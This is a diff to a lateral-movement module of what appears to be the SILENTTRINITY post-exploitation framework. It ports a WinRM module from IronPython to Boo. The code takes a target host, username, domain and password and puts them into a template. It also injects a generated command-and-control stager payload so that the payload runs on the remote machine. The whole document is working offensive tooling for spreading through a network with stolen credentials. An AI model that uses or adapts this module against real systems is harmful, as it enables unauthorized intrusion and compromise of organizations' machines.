@@ -2,10 +2,11 @@ import core.events as events
 from core.utils import print_bad
 from core.ipcserver import ipc_server
 
+
 class STModule:
     def __init__(self):
-        self.name = 'ipy/winrm'
-        self.language = 'ipy'
+        self.name = 'boo/winrm'
+        self.language = 'boo'
         self.description = 'Move laterally using winrm'
         self.author = '@byt3bl33d3r'
         self.options = {
@@ -48,14 +49,17 @@ class STModule:
         if stager and listener:
             stager.options['AsFunction']['Value'] = False
 
-            with open('modules/ipy/src/winrm.py', 'r') as module_src:
+            with open('modules/boo/src/winrm.boo', 'r') as module_src:
+                stage = stager.generate(listener, as_string=True)
+                stage = stage.replace("$", "\\$")
+
                 src = module_src.read()
                 src = src.replace('TARGET', self.options['Host']['Value'])
                 src = src.replace('USERNAME', self.options['Username']['Value'])
                 src = src.replace('DOMAIN', self.options['Domain']['Value'])
                 src = src.replace('PASSWORD', self.options['Password']['Value'])
-                src = src.replace('TRUSTED_HOSTS', str(self.options['AddToTrustedHosts']['Value']))
-                src = src.replace('PAYLOAD', stager.generate(listener, as_string=True))
+                src = src.replace('TRUSTED_HOSTS', str(self.options['AddToTrustedHosts']['Value']).lower())
+                src = src.replace('PAYLOAD', stage)
                 return src
 
         print_bad('Invalid listener selected')
